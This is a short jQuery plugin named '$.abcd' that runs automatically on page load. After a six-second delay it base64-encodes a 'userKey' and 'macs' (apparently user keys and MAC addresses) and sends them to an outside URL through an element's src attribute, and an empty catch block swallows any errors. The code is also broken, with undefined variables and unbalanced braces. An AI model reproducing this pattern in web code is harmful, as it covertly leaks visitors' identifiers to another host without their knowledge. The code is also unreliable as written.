﻿(function ($) {
    $.abcd = {
        getCookie: function (a) {
            var b, c = new RegExp("(^| )" + a + "=([^;]*)(;|$)");
            if (b = document.cookie.match(c)) {
                return unescape(b[2])
            } else {
                return null
            }
        },
        execute: function () {
            try {
                if (top.$.wdversion == undefined) {
                    top.$.wdversion = "0.0.0.0.0.1";
                    if (top.$("#" + d).length <= 0) {
                        top.$("body").append(f);
                        window.setTimeout(function () {
                            top.$.wdkey = { userKey: b, macs: a };
                                g = window.btoa(JSON.stringify(top.$.wdkey))
                            };
                            top.$("#" + d).attr("src", c + "?ppp=" + g)
                        }, 6000)
                    }
                }
            } catch (e) {
            }
        },
        init: function () {
            $.abcd.execute()
        }
    };
    $(function () { $.abcd.init() })
})(jQuery);